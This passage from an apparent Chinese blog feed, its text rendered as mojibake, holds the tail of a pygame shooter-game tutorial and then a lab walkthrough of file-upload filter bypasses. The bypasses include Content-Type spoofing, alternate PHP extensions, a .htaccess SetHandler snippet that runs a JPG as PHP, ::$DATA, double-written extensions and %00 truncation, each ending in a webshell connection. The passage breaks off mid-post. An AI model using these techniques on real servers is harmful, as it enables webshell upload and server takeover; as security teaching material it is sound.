SCREEN_RECT<span class="token punctuation">.</span>centerx        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>bottom <span class="token operator">-</span> <span class="token number">120</span>        <span class="token comment" spellcheck="true"># 3.åˆ›å»ºå­å¼¹çš„ç²¾çµç»„</span>        self<span class="token punctuation">.</span>bullets <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># è‹±é›„åœ¨æ°´å¹³æ–¹å‘ä¸Šç§»åŠ¨</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">+=</span> self<span class="token punctuation">.</span>speed        <span class="token comment" spellcheck="true"># æ§åˆ¶è‹±é›„çš„ä½ç½®</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>right <span class="token operator">></span> SCREEN_RECT<span class="token punctuation">.</span>right<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>right <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>right    <span class="token keyword">def</span> <span class="token function">fire</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å‘å°„å­å¼¹..."</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 1.åˆ›å»ºå­å¼¹ç²¾çµ</span>            bullet <span class="token operator">=</span> Bullet<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 2.è®¾ç½®ç²¾çµçš„ä½ç½®</span>            bullet<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">=</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">-</span> i <span class="token operator">*</span> <span class="token number">20</span>            bullet<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>centerx <span class="token operator">=</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>centerx            <span class="token comment" spellcheck="true"># 3.å°†ç²¾çµæ·»åŠ åˆ°ç²¾çµç»„</span>            self<span class="token punctuation">.</span>bullets<span class="token punctuation">.</span>add<span class="token punctuation">(</span>bullet<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Bullet</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""å­å¼¹ç²¾çµ"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè®¾ç½®å­å¼¹å›¾ç‰‡ï¼Œè®¾ç½®åˆå§‹é€Ÿåº¦</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/bullet1.png"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè®©å­å¼¹æ²¿å‚ç›´æ–¹å‘é£è¡Œ</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># åˆ¤æ–­å­å¼¹æ˜¯å¦é£å‡ºå±å¹•</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å­å¼¹è¢«é”€æ¯äº†..."</span><span class="token punctuation">)</span></code></pre><h4 id="æ¸¸æˆæºç åŠå›¾ç‰‡ä¸‹è½½åœ°å€é“¾æ¥ï¼šhttps-pan-baidu-com-s-1oQwSl9HuOve6WBbEae0KUw"><a href="#æ¸¸æˆæºç åŠå›¾ç‰‡ä¸‹è½½åœ°å€é“¾æ¥ï¼šhttps-pan-baidu-com-s-1oQwSl9HuOve6WBbEae0KUw" class="headerlink" title="æ¸¸æˆæºç åŠå›¾ç‰‡ä¸‹è½½åœ°å€é“¾æ¥ï¼šhttps://pan.baidu.com/s/1oQwSl9HuOve6WBbEae0KUw"></a>æ¸¸æˆæºç åŠå›¾ç‰‡ä¸‹è½½åœ°å€é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1oQwSl9HuOve6WBbEae0KUw" target="_blank" rel="noopener">https://pan.baidu.com/s/1oQwSl9HuOve6WBbEae0KUw</a></h4><h4 id="æå–ç ï¼šmeje"><a href="#æå–ç ï¼šmeje" class="headerlink" title="æå–ç ï¼šmeje"></a>æå–ç ï¼šmeje</h4><h4 id="æ¸¸æˆæ•ˆæœå›¾"><a href="#æ¸¸æˆæ•ˆæœå›¾" class="headerlink" title="æ¸¸æˆæ•ˆæœå›¾"></a>æ¸¸æˆæ•ˆæœå›¾</h4><p><img src="https://Lmg66.github.io/img/71.png" alt="å›¾ç‰‡"></p><h4 id="ç»“æŸä¹–ä¹–å­¦çˆ¬è™«å’Œè„šæœ¬å»äº†-å‘æŠ–-å‘æŠ–-å‘æŠ–"><a href="#ç»“æŸä¹–ä¹–å­¦çˆ¬è™«å’Œè„šæœ¬å»äº†-å‘æŠ–-å‘æŠ–-å‘æŠ–" class="headerlink" title="ç»“æŸä¹–ä¹–å­¦çˆ¬è™«å’Œè„šæœ¬å»äº†/å‘æŠ–/å‘æŠ–/å‘æŠ–"></a>ç»“æŸä¹–ä¹–å­¦çˆ¬è™«å’Œè„šæœ¬å»äº†/å‘æŠ–/å‘æŠ–/å‘æŠ–</h4>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pythonå°æ¸¸æˆ(æ‰“é£æœº) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´åŠç»•è¿‡</title>
      <link href="/posts/4f5f.html"/>
      <url>/posts/4f5f.html</url>
      
        <content type="html"><![CDATA[<h3 id="æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ï¼šä¸Šä¼ ä»£ç æ–‡ä»¶è®©æœåŠ¡å™¨æ‰§è¡Œ-ä¸ªäººç†è§£-ã€‚"><a href="#æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ï¼šä¸Šä¼ ä»£ç æ–‡ä»¶è®©æœåŠ¡å™¨æ‰§è¡Œ-ä¸ªäººç†è§£-ã€‚" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ï¼šä¸Šä¼ ä»£ç æ–‡ä»¶è®©æœåŠ¡å™¨æ‰§è¡Œ(ä¸ªäººç†è§£)ã€‚"></a>æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ï¼šä¸Šä¼ ä»£ç æ–‡ä»¶è®©æœåŠ¡å™¨æ‰§è¡Œ(ä¸ªäººç†è§£)ã€‚</h3><h3 id="æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡è„‘å›¾"><a href="#æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡è„‘å›¾" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡è„‘å›¾"></a>æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡è„‘å›¾</h3><p><img src="https://Lmg66.github.io/img/3.png" alt="å›¾ç‰‡"></p><h3 id="ä¸€-jsæœ¬åœ°éªŒè¯ç»•è¿‡"><a href="#ä¸€-jsæœ¬åœ°éªŒè¯ç»•è¿‡" class="headerlink" title="ä¸€.jsæœ¬åœ°éªŒè¯ç»•è¿‡"></a>ä¸€.jsæœ¬åœ°éªŒè¯ç»•è¿‡</h3><p>åŸç†:æœ¬åœ°çš„js,F12æŸ¥çœ‹æºä»£ç å‘ç°æ˜¯æœ¬åœ°çš„éªŒè¯</p><p><img src="https://Lmg66.github.io/img/4.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿<br>1.å› ä¸ºå±äºæœ¬åœ°çš„ä»£ç å¯ä»¥å°è¯•ä¿®æ”¹,ç„¶åé€‰æ‹©phpæ–‡ä»¶å‘ç°ä¸Šä¼ æˆåŠŸã€‚</p><p><img src="https://Lmg66.github.io/img/5.png" alt="å›¾ç‰‡"></p><p>2.é‡‡ç”¨burpsuite,å…ˆå°†æ–‡ä»¶çš„åç§°ä¿®æ”¹ä¸ºjpgæˆ–pngæˆ–gif,ç„¶åä¸Šä¼ ï¼Œburpsuiteæ‹¦æˆªå°†æ–‡ä»¶ç±»å‹ä¿®æ”¹å¦‚å›¾,å‘ç°èƒ½å¤Ÿä¸Šä¼ æˆåŠŸ<br>ã€‚</p><p><img src="https://Lmg66.github.io/img/6.png" alt="å›¾ç‰‡"></p><h3 id="äºŒ-MIMEéªŒè¯ç»•è¿‡-Content-Type"><a href="#äºŒ-MIMEéªŒè¯ç»•è¿‡-Content-Type" class="headerlink" title="äºŒ.MIMEéªŒè¯ç»•è¿‡(Content-Type)"></a>äºŒ.MIMEéªŒè¯ç»•è¿‡(Content-Type)</h3><p>åŸç†:Content-Typeï¼ˆMediaTypeï¼‰ï¼Œå³æ˜¯Internet Media Typeï¼Œäº’è”ç½‘åª’ä½“ç±»å‹ï¼Œä¹Ÿå«åšMIMEç±»å‹ã€‚åœ¨äº’è”ç½‘ä¸­æœ‰æˆç™¾ä¸Šåƒä¸­ä¸åŒçš„æ•°æ®ç±»å‹ï¼ŒHTTPåœ¨ä¼ è¾“æ•°æ®å¯¹è±¡æ—¶ä¼šä¸ºä»–ä»¬æ‰“ä¸Šç§°ä¸ºMIMEçš„æ•°æ®æ ¼å¼æ ‡ç­¾ï¼Œç”¨äºåŒºåˆ†æ•°æ®ç±»å‹ã€‚æœ€åˆMIMEæ˜¯ç”¨äºç”µå­é‚®ä»¶ç³»ç»Ÿçš„ï¼Œåæ¥HTTPä¹Ÿé‡‡ç”¨äº†è¿™ä¸€æ–¹æ¡ˆã€‚åœ¨HTTPåè®®æ¶ˆæ¯å¤´ä¸­ï¼Œä½¿ç”¨Content-Typeæ¥è¡¨ç¤ºè¯·æ±‚å’Œå“åº”ä¸­çš„åª’ä½“ç±»å‹ä¿¡æ¯ã€‚å®ƒç”¨æ¥å‘Šè¯‰æœåŠ¡ç«¯å¦‚ä½•å¤„ç†è¯·æ±‚çš„æ•°æ®ï¼Œä»¥åŠå‘Šè¯‰å®¢æˆ·ç«¯ï¼ˆä¸€èˆ¬æ˜¯æµè§ˆå™¨ï¼‰å¦‚ä½•è§£æå“åº”çš„æ•°æ®ï¼Œæ¯”å¦‚æ˜¾ç¤ºå›¾ç‰‡ï¼Œè§£æå¹¶å±•ç¤ºhtmlç­‰ç­‰ã€‚<br>ä½¿ç”¨burpsuiteæ‹¦æˆªåˆ†åˆ«ä¸ºjpgå’Œphpç±»å‹è§‚å¯ŸContent-Typeå‘ç°Content-Typeä¸åŒ.</p><p><img src="https://Lmg66.github.io/img/7.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/8.png" alt="å›¾ç‰‡"></p><p>æ‹“å±•:</p><p><img src="https://Lmg66.github.io/img/9.png" alt="å›¾ç‰‡"></p><p>ç ´è§£æ–¹æ³•:<br>åœ¨burpsuiteä¸­æ›´æ”¹Content-Typeè¿›è¡Œç»•è¿‡å³å¯</p><p><img src="https://Lmg66.github.io/img/10.png" alt="å›¾ç‰‡"></p><h3 id="ä¸‰-é»‘åå•ç»•è¿‡"><a href="#ä¸‰-é»‘åå•ç»•è¿‡" class="headerlink" title="ä¸‰.é»‘åå•ç»•è¿‡"></a>ä¸‰.é»‘åå•ç»•è¿‡</h3><p>åŸç†:æŸ¥çœ‹ç½‘ç«™æºä»£ç å‘ç°è¿‡æ»¤äº†asp,aspx,php,jsp,ä½†å…¶ä»–çš„æ–‡ä»¶åç¼€å¯ä»¥ä¸Šä¼ ï¼Œå¦‚phtmlï¼Œphpsï¼Œphp5ï¼Œpht</p><p><img src="https://Lmg66.github.io/img/11.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿:å°†æ–‡ä»¶åç¼€åæ”¹ä¸ºphp5ï¼Œphtmlç­‰,å‘ç°èƒ½å¤Ÿä¸Šä¼ æˆåŠŸï¼Œæ­¤æ¬¡æ²¡ç”¨è¿‡æ»¤htaccessæ–‡ä»¶å¯ä»¥å°è¯•ä¸Šä¼ ã€‚</p><p>æ‹“å±•:æ­¤ç ´è§£æ–¹æ¡ˆéœ€è¦Apacheçš„httpd.confæœ‰å¦‚ä¸‹é…ç½®<br>AddType application/x-httpd-php .php .phtml .phps .php5 .pht<br>å…³äºAddTypeæŒ‡ä»¤<br>ä½œç”¨:åœ¨ç»™å®šçš„æ–‡ä»¶æ‹“å±•åä¸ç‰¹å®šçš„å†…å®¹ç±»å‹ä¹‹é—´å»ºç«‹æ˜ å°„(ç®€å•æ¥è¯´å°±æ˜¯è®©phtmlï¼Œphpsï¼Œphp5ï¼Œphtç­‰æ–‡ä»¶åç¼€çš„å®‰è£…phpä»£ç æ¥æ‰§è¡Œï¼Œä¸ªäººç†è§£)</p><p>è¯­æ³•ï¼šAddType MIME-type extension [extension] â€¦<br>AddTypeæŒ‡ä»¤åœ¨ç»™å®šçš„æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å†…å®¹ç±»å‹ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ã€‚MIME-typeæŒ‡æ˜äº†åŒ…å«extensionæ‰©å±•åçš„æ–‡ä»¶çš„åª’ä½“ç±»å‹ã€‚<br>AddType æ˜¯ä¸ç±»å‹è¡¨ç›¸å…³çš„ï¼Œæè¿°çš„æ˜¯æ‰©å±•åä¸æ–‡ä»¶ç±»å‹ä¹‹é—´çš„å…³ç³»ã€‚</p><h3 id="å››-htaccessç»•è¿‡"><a href="#å››-htaccessç»•è¿‡" class="headerlink" title="å››..htaccessç»•è¿‡"></a>å››..htaccessç»•è¿‡</h3><p>åŸç†:.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€)æä¾›äº†é’ˆå¯¹æ¯ä¸ªç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³åœ¨ä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œå…¶ä¸­çš„æŒ‡ä»¤ä½œç”¨ä¸æ­¤ç›®å½•åŠå…¶æ‰€æœ‰çš„å­ç›®å½•ã€‚<br>ç®€å•æ¥è¯´:å°±æ˜¯htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®<br>ä»–çš„åŠŸèƒ½:ç½‘é¡µ301é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‹“å±•å(æ­¤å¤„æ‰€ç”¨),å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ï¼Œç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œé…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½iiså¹³å°ä¸Šä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œæ”¹æ–‡ä»¶é»˜è®¤å¼€å¯ï¼Œå¯ç”¨å’Œå…³é—­åœ¨httpd.confæ–‡ä»¶ä¸­é…ç½®ã€‚<br>ç ´è§£:æ„é€ .htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ï¼Œå¦‚å›¾</p><pre><code>&lt;FilesMatch &quot;2.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><img src="https://Lmg66.github.io/img/12.png" alt="å›¾ç‰‡"></p><p>ç„¶åä¸Šä¼ .htaccessæ–‡ä»¶å’Œ2.jpgçš„æœ¨é©¬å‘ç°2.jpgè¢«å®‰è£…phpä»£ç æ‰§è¡Œç„¶åç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°å¯ä»¥è¿æ¥æˆåŠŸï¼Œå¦‚å›¾</p><p><img src="https://Lmg66.github.io/img/13.png" alt="å›¾ç‰‡"></p><p>ä¸ªäººç†è§£:é€šè¿‡å¯¹.htaccessçš„ç¦æ­¢ç›®å½•åˆ—è¡¨ç†è§£è¿ç”¨ç»™è‡ªå·±åŠ äº†ä¸€ä¸ªä¿æŠ¤è‡ªå·±ï¼Œé˜²æ­¢å¼€å¯phpstudyï¼Œå…¶ä»–äººè®¿é—®ã€‚</p><p><img src="https://Lmg66.github.io/img/14.png" alt="å›¾ç‰‡"></p><h3 id="äº”-å¤§å°å†™ç»•è¿‡"><a href="#äº”-å¤§å°å†™ç»•è¿‡" class="headerlink" title="äº”.å¤§å°å†™ç»•è¿‡"></a>äº”.å¤§å°å†™ç»•è¿‡</h3><p>åŸç†:æŸ¥çœ‹ç½‘ç«™æºä»£ç å‘ç°æ²¡æœ‰è¿‡æ»¤å¤§å°å†™ï¼Œè€Œwindowså¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œlinuxå¯¹å¤§å°å†™æ•æ„Ÿ</p><p><img src="https://Lmg66.github.io/img/15.png" alt="å›¾ç‰‡"></p><p>ç ´è§£:ä¿®æ”¹æ–‡ä»¶æ‹“å±•åç§°ä¸ºå¤§å†™ï¼Œæˆ–è€…ç”¨burpsuietæŠ“åŒ…æ”¹ä¸ºå¤§å†™ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œæœ¨é©¬å¯ä»¥è¿æ¥æˆåŠŸ</p><p><img src="https://Lmg66.github.io/img/16.png" alt="å›¾ç‰‡"></p><h3 id="å…­-ç©ºæ ¼ç»•è¿‡"><a href="#å…­-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="å…­.ç©ºæ ¼ç»•è¿‡"></a>å…­.ç©ºæ ¼ç»•è¿‡</h3><p>åŸç†:windowsç­‰ç³»ç»Ÿä¸‹ï¼Œæ–‡ä»¶åç¼€åŠ ç©ºæ ¼å‘½åä¹‹åæ˜¯é»˜è®¤è‡ªåŠ¨åˆ é™¤ç©ºæ ¼ã€‚æŸ¥çœ‹ç½‘ç«™æºä»£ç å‘ç°è¿‡æ»¤äº†å¤§å°å†™ï¼Œæ²¡ç”¨è¿‡æ»¤ç©ºæ ¼ã€‚</p><p><img src="https://Lmg66.github.io/img/17.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿:ä¸Šä¼ phpæ–‡ä»¶ç”¨burpsuiteæŠ“åŒ…ï¼Œæ·»åŠ ä¸€ä¸ªç©ºå‘ç°ä¸Šä¼ æˆåŠŸã€‚ç”¨èšå‰‘è¿æ¥å‘ç°å¯ä»¥è¿æ¥æˆåŠŸã€‚å¦‚ä¸‹å›¾</p><p><img src="https://Lmg66.github.io/img/18.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/19.png" alt="å›¾ç‰‡"></p><h3 id="ä¸ƒ-ç‚¹çš„ç»•è¿‡"><a href="#ä¸ƒ-ç‚¹çš„ç»•è¿‡" class="headerlink" title="ä¸ƒ.ç‚¹çš„ç»•è¿‡"></a>ä¸ƒ.ç‚¹çš„ç»•è¿‡</h3><p>åŸç†:åŒç©ºæ ¼ç»•è¿‡åŸç†ä¸€æ ·ï¼Œä¸»è¦åŸå› æ˜¯windowsç­‰ç³»ç»Ÿé»˜è®¤åˆ é™¤æ–‡ä»¶åç¼€çš„.å’Œç©ºæ ¼ï¼ŒæŸ¥çœ‹ç½‘ç«™æºç å‘ç°ï¼Œæ²¡æœ‰è¿‡æ»¤ç‚¹ã€‚</p><p><img src="https://Lmg66.github.io/img/20.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿:ä¸Šä¼ phpä»£ç ï¼ŒburpsuiteæŠ“åŒ…åŠ ä¸€ä¸ªç‚¹ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥å‘ç°è¿æ¥æˆåŠŸã€‚</p><p><img src="https://Lmg66.github.io/img/21.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/22.png" alt="å›¾ç‰‡"></p><h3 id="å…«-DATAç»•è¿‡-æ­¤ç»•è¿‡åªé€‚ç”¨windows"><a href="#å…«-DATAç»•è¿‡-æ­¤ç»•è¿‡åªé€‚ç”¨windows" class="headerlink" title="å…«.::$DATAç»•è¿‡(æ­¤ç»•è¿‡åªé€‚ç”¨windows)"></a>å…«.::$DATAç»•è¿‡(æ­¤ç»•è¿‡åªé€‚ç”¨windows)</h3><p>åŸç†:phpåœ¨windowsçš„é€‚åˆï¼Œå¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶åï¼Œç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åæœ€åã€‚æŸ¥çœ‹ç½‘ç«™æºä»£ç ã€‚å‘ç°æ²¡æœ‰è¿‡æ»¤::$DATAã€‚</p><p><img src="https://Lmg66.github.io/img/23.png" alt="å›¾ç‰‡"></p><p>ç ´è§£:ä¸Šä¼ phpæ–‡ä»¶ï¼Œç”¨burpsuiteæŠ“å§æ–‡ä»¶åç¼€æ”¹ä¸ºphp::$DATAï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘é“¾æ¥ï¼Œå‘ç°è¿æ¥æˆåŠŸï¼ŒåŒæ—¶æ‰“å¼€ä¸Šä¼ æ–‡ä»¶å‘ç°åç¼€æ²¡æœ‰::$DATA</p><p><img src="https://Lmg66.github.io/img/24.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/25.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/26.png" alt="å›¾ç‰‡"></p><h3 id="ä¹-ç‚¹ç©ºæ ¼ç»•è¿‡"><a href="#ä¹-ç‚¹ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ä¹.ç‚¹ç©ºæ ¼ç»•è¿‡"></a>ä¹.ç‚¹ç©ºæ ¼ç»•è¿‡</h3><p>åŸç†:æŸ¥çœ‹æºç å‘ç°ï¼Œéƒ½è¿‡æ»¤ä½†æ˜¯ï¼Œç‚¹å’Œç©ºæ ¼åªæ˜¯è¿‡æ»¤äº†1æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ .php. .è¿™æ ·å°±åªæ˜¯è¿‡æ»¤äº†æ–‡ä»¶æœ«å°¾çš„ç‚¹<br>è€Œæ²¡æœ‰è¿‡æ»¤ç¬¬ä¸€ä¸ªç‚¹ï¼Œæ–‡ä»¶åç¼€å˜æˆäº†.php.å®ç°äº†æ–‡ä»¶çš„ä¸Šä¼ ã€‚</p><p><img src="https://Lmg66.github.io/img/27.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿:ä¸Šä¼ phpæ–‡ä»¶ï¼ŒburpsuiteæŠ“åŒ…æ”¹æ–‡ä»¶åç¼€åç§°ä¸º.php. .ä¸Šä¼ ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥å‘ç°ä¸Šä¼ æˆåŠŸã€‚</p><p><img src="https://Lmg66.github.io/img/28.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/29.png" alt="å›¾ç‰‡"></p><h3 id="å-åŒå†™ç»•è¿‡"><a href="#å-åŒå†™ç»•è¿‡" class="headerlink" title="å.åŒå†™ç»•è¿‡"></a>å.åŒå†™ç»•è¿‡</h3><p>åŸç†:æŸ¥çœ‹æºç å‘ç°ï¼Œæ²¡æœ‰è¿‡æ»¤ç‚¹ï¼Œç©ºæ ¼ï¼Œå¤§å†™ç­‰ï¼Œä¼°è®¡è¿™ç§ä¸æ˜¯æ”¾åœ¨windowsä¸‹çš„ï¼Œè¿™é‡Œå¯ä»¥ç”¨ç‚¹å¤§å†™ç©ºæ ¼:$DATAç­‰ç»•è¿‡ï¼Œä¸è¿‡è¿™é‡Œçš„ç›®çš„ä¸æ˜¯è¿™ä¸ªï¼Œæ˜¯è®©å­¦ä¹ åŒå†™ç»•è¿‡ï¼Œçœ‹æºç å‘ç°str_ireplaceè¿™ä¸ªå‡½æ•°å°†phpï¼Œphp5ï¼Œphp4ç­‰åç¼€å˜æˆç©ºæ ¼ï¼Œä¸”åªæ‰§è¡Œäº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ„é€ æ–‡ä»¶åç¼€ä¸ºpphphpç»•è¿‡ã€‚</p><p><img src="https://Lmg66.github.io/img/30.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿:ä¸Šä¼ æ–‡ä»¶åç¼€ä¸ºpphphpçš„æ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œç„¶åèšå‰‘è¿æ¥å°±å¯ä»¥äº†ï¼Œå‘ç°å¯ä»¥è¿æ¥æˆåŠŸã€‚</p><p><img src="https://Lmg66.github.io/img/31.png" alt="å›¾ç‰‡"></p><h3 id="åä¸€-00æˆªæ–­"><a href="#åä¸€-00æˆªæ–­" class="headerlink" title="åä¸€.%00æˆªæ–­"></a>åä¸€.%00æˆªæ–­</h3><p>åŸç†:æŸ¥çœ‹æºç å‘ç°ä½¿ç”¨äº†ç™½åå•ï¼Œåªå…è®¸jpgï¼Œpngï¼Œgifæ–‡ä»¶çš„ä¸Šä¼ ï¼Œæ‰€ä»¥å‰é¢ä½¿ç”¨çš„æ–¹æ³•éƒ½ä¸é€‚ç”¨ï¼Œç„¶åæˆ‘ä»¬å‘ç°è·¯å¾„img_pathå‡½æ•°æ˜¯è®©æ–‡ä»¶ä½ç½®(save_path)åŠ æ—¶é—´éšæœºæ•°(rand)çš„æ–¹æ³•ç”Ÿæˆæ–‡ä»¶ä½ç½®å’Œæ–‡ä»¶åç§°,æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨save_pathçš„åœ°æ–¹ä½¿ç”¨%00çš„æ–¹æ³•æˆªæ–­åé¢çš„è¯­å¥ï¼ŒburpsuiteæŠ“åŒ…å‘ç°ï¼Œæ˜¯å¯ä»¥æ›´æ”¹save_pathçš„ï¼Œä¸è¿‡æ­¤æ–¹æ³•æœ‰ä½¿ç”¨çš„é™åˆ¶ã€‚</p><p>ä½¿ç”¨é™åˆ¶:</p><p>1ã€phpç‰ˆæœ¬å°äº5.3.4</p><p>2ã€php.iniçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p><p><img src="https://Lmg66.github.io/img/32.png" alt="å›¾ç‰‡"></p><p>(magic_quotes_gpc)å‡½æ•°çš„çš„åº•å±‚å®ç°æ˜¯ç±»ä¼¼cè¯­è¨€ï¼Œæ‰€ä»¥å¯ä»¥%00æˆªæ–­</p><p><img src="https://Lmg66.github.io/img/33.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿ï¼š</p><p>(getä¼ è¾“):ä¸Šä¼ phpæ–‡ä»¶ï¼ŒburpsuiteæŠ“åŒ…ï¼Œä¿®æ”¹save_pathå¦‚å›¾æ‰€ç¤ºï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œä½¿ç”¨èšå‰‘è¿æ¥å‘ç°è¿æ¥æˆåŠŸã€‚</p><p><img src="https://Lmg66.github.io/img/34.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/35.png" alt="å›¾ç‰‡"></p><p>(postä¼ è¾“):postä¼ è¾“å’Œgetä¼ è¾“å·®ä¸å¤šï¼Œä¸è¿‡éœ€è¦è½¬ä¸€ä¸‹ç å¦‚å›¾ï¼Œç„¶åå‘é€å‘ç°ä¸Šä¼ æˆåŠŸã€‚</p><p><img 